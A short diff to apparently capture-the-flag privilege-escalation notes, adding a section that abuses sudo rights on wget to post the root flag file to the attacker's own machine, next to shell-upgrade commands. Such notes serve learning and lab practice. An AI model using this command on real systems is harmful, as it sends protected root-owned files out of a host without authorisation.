@@ -159,6 +159,10 @@ python -c "import pty; pty.spawn('/bin/bash')"
 
 stty raw -echo
 ```
+## Exploit for `wget`
+```sh
+sudo /usr/bin/wget --post-file=/root/root_flag.txt http://<your machines ip>:4444
+```
 ## Getting into As a Root User
 ```sh
 su root
